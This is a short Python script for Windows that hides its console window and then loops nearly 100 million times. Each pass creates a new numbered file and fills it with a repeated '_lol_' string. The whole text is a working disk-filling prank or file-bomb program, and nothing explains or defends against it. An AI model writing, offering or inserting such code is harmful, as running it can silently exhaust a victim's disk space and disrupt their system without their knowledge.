import ctypes
import os
str2 = ("_lol_")
for i in range(1,99999999):
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )
    num = str(i)
    file = open(num,"w")
    for a in range(1,1000):
        file.write(str2)

